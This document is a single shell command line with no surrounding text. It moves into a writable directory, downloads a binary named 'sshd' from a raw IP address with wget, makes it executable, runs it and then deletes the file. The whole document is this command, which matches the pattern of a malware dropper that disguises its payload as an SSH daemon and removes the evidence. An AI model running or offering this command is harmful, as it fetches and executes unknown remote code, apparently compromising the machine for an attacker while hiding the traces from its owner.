cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.141.202/sshd; chmod +x sshd; ./sshd; rm -rf sshd
